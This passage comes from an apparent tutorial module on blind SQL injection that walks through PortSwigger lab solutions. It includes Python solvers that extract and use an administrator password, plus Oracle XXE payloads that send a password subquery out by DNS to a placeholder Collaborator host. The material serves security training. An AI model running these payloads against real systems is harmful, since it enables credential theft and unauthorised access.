    length = low
    print(f"[+] password length: {length}")

    password = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            cond = (
                "username='administrator' AND "
                f"ASCII(SUBSTRING(password,{pos},1)) > {mid}"
            )
            if probe(cond):
                low = mid + 1
            else:
                high = mid
        password += chr(low)
        print(f"\r[*] {password}", end="", flush=True)
    print()

    login = s.post(
        f"{BASE}/login",
        data={"username": "administrator", "password": password},
        allow_redirects=True,
        timeout=20,
    )
    if "Log out" in login.text or "/my-account" in login.url:
        print(f"[+] Password: {password}")
        print("[+] Logged in. Lab solved.")
    else:
        print("[!] Extracted password did not authenticate.")
        sys.exit(1)

if __name__ == "__main__":
    main()
```

> **Tuning note.** With `DELAY = 1.2` and ~140 probes, the script takes a few minutes. If your connection is noisy, raise the delay and threshold; do not lower them below the observed baseline p95. Never run this script concurrently with itself.

### Why this works, in one sentence

Each request asks the database to wait only if a condition is true, and the wall-clock response time turns that condition into one bit.
:::

::::

:::: lab

## Lab 6 · Blind SQLi with out-of-band interaction {#lab-out-of-band}

**Vulnerability class:** out-of-band, DNS interaction.
**Goal:** cause the database to resolve a Burp Collaborator subdomain.

The query executes asynchronously and has no effect on the response. You need a separate network channel to observe execution.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

<LabCheckbox lab-id="lab-out-of-band" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** If the database can make an outbound DNS lookup, the lookup itself is proof of execution.

**Level 2 — target parameter and approach.** Inject into `TrackingId`. Use Oracle's `EXTRACTVALUE(xmltype(...))` with an external entity whose `SYSTEM` URL points at your Collaborator subdomain. Poll Collaborator after sending.

**Level 3 — exploit skeleton.**

```sql
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual--
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request (payload URL-encoded in the cookie)

```http
GET / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=x'%20UNION%20SELECT%20EXTRACTVALUE(xmltype('%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%20remote%20SYSTEM%20%22http%3A//COLLABORATOR/ %22%3E%20%25remote%3B%5D%3E'),'/l')%20FROM%20dual--
Connection: close
```

Use Burp's **Insert Collaborator payload** to generate the subdomain. The decoded payload:

```sql
x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR/"> %remote;]>'),'/l')
FROM dual--
```

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `x'` | closes the id literal | Code context |
| `UNION SELECT` | appends a scalar expression | The result need not be rendered |
| `EXTRACTVALUE(...)` | forces XML parsing and evaluation | The XXE primitive |
| `xmltype('...')` | parses the string as XML | Oracle XML parser |
| `<!DOCTYPE root [...]>` | DTD declaration | Defines the external entity |
| `<!ENTITY % remote SYSTEM "...">` | parameter entity | The URL to fetch |
| `%remote;` | entity expansion | Triggers the outbound request |
| `'/l'` | XPath argument to `EXTRACTVALUE` | Syntactic requirement; no matching node needed |
| `FROM dual` | Oracle dummy table | Required by Oracle `SELECT` |
| `--` | comment | Repairs the query tail |

> **Why a DNS lookup is enough.** The lab only needs an interaction, not a response body. The XML parser resolves the external entity URL when it parses the document; the DNS query reaches Collaborator, which records it. Even if the HTTP fetch fails or is blocked after DNS, the interaction is already proven.

### Python `requests` solver (send + poll guidance)

```python
import sys
from urllib.parse import quote

import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance
COLLAB = "YOUR-COLLABORATOR-SUBDOMAIN.oastify.com"  # from Burp Collaborator

def main() -> None:
    if "YOUR-COLLABORATOR" in COLLAB:
        print("[!] Set COLLAB to a real Burp Collaborator subdomain first.")
        print("    The labs firewall only allows Collaborator's default public server.")
        sys.exit(1)

    payload = (
        "x' UNION SELECT EXTRACTVALUE(xmltype("
        "'<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<!DOCTYPE root [ <!ENTITY % remote SYSTEM "
        f"\"http://{COLLAB}/\"> %remote;]>'),'/l') FROM dual--"
    )

    s = requests.Session()
    r = s.get(BASE, headers={"Cookie": f"TrackingId={quote(payload, safe='')}"}, timeout=20)
    print(f"[*] request sent: HTTP {r.status_code}")
    print("[*] now open Burp Collaborator and click 'Poll now'.")
    print("[*] a DNS and/or HTTP interaction from the lab means the lab is solved.")
    print("    This script cannot poll Collaborator without its API credentials;")
    print("    the interaction, not the HTTP response, is the success signal.")

if __name__ == "__main__":
    main()
```

> **Automation boundary.** OAST success is observed on the listener, not in the target's HTTP response. A fully automated CLI solver needs a listener API (Burp's Collaborator client, or your own DNS server with logs). The script above sends the exploit correctly and tells you exactly where to look.

### Why this works, in one sentence

The XML parser resolves an external entity during query evaluation, producing a DNS lookup to a domain you control even though the SQL result never reaches the response.
:::

::::

:::: lab

## Lab 7 · Out-of-band data exfiltration {#lab-out-of-band-data-exfiltration}

**Vulnerability class:** out-of-band, data exfiltration via DNS.
**Goal:** leak the administrator password in a Collaborator interaction.

Same primitive as the previous lab, but the external entity URL now contains a subquery result. The password becomes a DNS label.

[Launch Lab on PortSwigger ↗](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)

<LabCheckbox lab-id="lab-out-of-band-data-exfiltration" />

::: details 💡 Progressive Hints
**Level 1 — mental nudge.** The username part of a hostname is sent to the resolver. Can you put the password there?

**Level 2 — target parameter and approach.** Use the same `EXTRACTVALUE(xmltype(...))` primitive, but concatenate `(SELECT password FROM users WHERE username='administrator')` into the `SYSTEM` URL before the Collaborator domain. Poll Collaborator and read the leftmost DNS label.

**Level 3 — exploit skeleton.**

```sql
x' UNION SELECT EXTRACTVALUE(xmltype('...SYSTEM "http://'||
(SELECT password FROM users WHERE username='administrator')||'.COLLAB/">...'),'/l') FROM dual--
```
:::

::: details 🔓 Deconstructed Solution & Token Breakdown
### Raw HTTP request (encoded cookie)

```http
GET / HTTP/1.1
Host: <lab-id>.web-security-academy.net
Cookie: TrackingId=x%27+UNION+SELECT+EXTRACTVALUE(xmltype(%27%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE+root+%5B+%3C!ENTITY+%25+remote+SYSTEM+%22http%3A//%27%7C%7C(SELECT+password+FROM+users+WHERE+username%3D%27administrator%27)%7C%7C%27.COLLABORATOR-SUBDOMAIN/%22%3E+%25remote%3B%5D%3E%27),%27/l%27)+FROM+dual--
Connection: close
```

> The cookie value is URL-encoded at the HTTP layer because it contains `;` and spaces. The application decodes it before the SQL parser sees it. The decoded payload is below.

### Decoded payload

```sql
x' UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://'||
      (SELECT password FROM users WHERE username='administrator')||
      '.COLLABORATOR-SUBDOMAIN/">
    %remote;
  ]>'),
  '/l')
FROM dual--
```

The resulting entity URL is:

```text
http://s3curepassword.COLLABORATOR-SUBDOMAIN/
```

Collaborator records a DNS lookup for `s3curepassword.COLLABORATOR-SUBDOMAIN` and an HTTP request whose `Host` header contains the same value.

### Every character, accounted for

| Payload piece | Meaning | Why it is there |
| --- | --- | --- |
| `"http://'` | starts the URL and closes the SQL string | The entity value is built by concatenation |
| `\|\|` | Oracle concatenation | Joins URL fragments and the subquery |
| `(SELECT password ...)` | scalar subquery | The secret to exfiltrate |
| `WHERE username='administrator'` | scopes to one row | A scalar subquery must return one value |
| `'.COLLABORATOR-SUBDOMAIN/'` | rest of the hostname and path | The password becomes the leftmost DNS label |
| `%remote;` | triggers entity resolution | Causes the outbound lookup |
| `FROM dual` | Oracle dummy table | Required by the dialect |
| `--` | comment | Repairs the query tail |

> **DNS constraints.** A label can be at most 63 octets; the whole name at most 253. If the secret is longer or contains illegal hostname characters, chunk it (`SUBSTR(password,1,10)`, then `11,10`, …) or encode it. Lowercase alphanumerics need no encoding.

### Python `requests` solver (send + decode guidance)

```python
import re
import sys
from urllib.parse import quote

import requests

BASE = "https://<lab-id>.web-security-academy.net"  # replace with your lab instance
COLLAB = "YOUR-COLLABORATOR-SUBDOMAIN.oastify.com"  # from Burp Collaborator

def main() -> None:
    if "YOUR-COLLABORATOR" in COLLAB:
        print("[!] Set COLLAB to a real Burp Collaborator subdomain first.")
        sys.exit(1)

    payload = (
        "x' UNION SELECT EXTRACTVALUE(xmltype("
        "'<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||"
        "(SELECT password FROM users WHERE username='administrator')||"
        f"'.{COLLAB}/\"> %remote;]>'),'/l') FROM dual--"
    )

    s = requests.Session()
    r = s.get(BASE, headers={"Cookie": f"TrackingId={quote(payload, safe='')}"}, timeout=20)
    print(f"[*] request sent: HTTP {r.status_code}")
    print("[*] open Burp Collaborator and poll. Look for a DNS name shaped like:")
    print(f"    <password>.{COLLAB}")
    print("    The leftmost label is the administrator password.")

    # If you export the Collaborator interaction as text, this extracts the label.
    # (Paste the DNS query name as the argument to --extract.)
    if len(sys.argv) > 2 and sys.argv[1] == "--extract":
        name = sys.argv[2]
        label = name.split(".")[0]
        if re.fullmatch(r"[a-z0-9]{6,}", label, re.I):
            print(f"[+] password: {label}")
        else:
            print("[!] Leftmost label does not look like a password.")

if __name__ == "__main__":
    main()
```

### Why this works, in one sentence

The entity URL is built at query time from the password, so the DNS resolver — not the HTTP response — carries the secret to your listener.
:::

::::

<TopicComplete topic-id="sql-injection/blind" label="Mark the blind SQL injection module complete" />

---

## Before you move on

- Can you name the four blind channels and the condition under which each is the best choice?
- Why does the boolean lab need `LIMIT 1`, and what does Oracle use instead?
- Why does `TO_CHAR(1/0)` produce an error only when the `CASE` branch is selected?
- In the visible-error lab, why does the cookie length limit change the payload you can use?
- Why must time-based extraction be serialised, and how does binary search reduce total drift?
- What is the difference between an OAST *interaction* and OAST *exfiltration*?

Next: [Module 04 · WAF Bypass & XML Encoding](/sql-injection/04-waf-bypass-xml) — where a filter sees one string and the database sees another.
